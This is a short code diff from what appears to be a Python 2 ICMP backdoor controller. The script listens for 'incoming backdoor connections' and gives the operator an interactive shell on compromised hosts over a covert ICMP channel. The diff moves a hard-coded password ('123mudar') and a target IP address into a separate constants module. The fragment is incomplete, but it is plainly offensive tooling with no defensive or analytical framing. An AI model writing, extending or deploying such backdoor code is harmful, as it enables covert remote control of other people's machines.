@@ -2,9 +2,8 @@
 # encoding: utf-8
 
 import os, sys, socket, struct, select, time, string, argparse
-ICMP_ECHO_REQUEST = 8
-PASSWORD = "123mudar"
 from icmpclient import Icmpclient
+from const import *
 
 def shell(client):
     cmd = ""
@@ -27,7 +26,7 @@ def shell(client):
     sys.exit()
 
 ############## MAIN ###############
-s = Icmpclient("10.0.24.5")
+s = Icmpclient()
 resp = "N0TH1NG"
 
 print "Listening for incoming backdoor connections..."
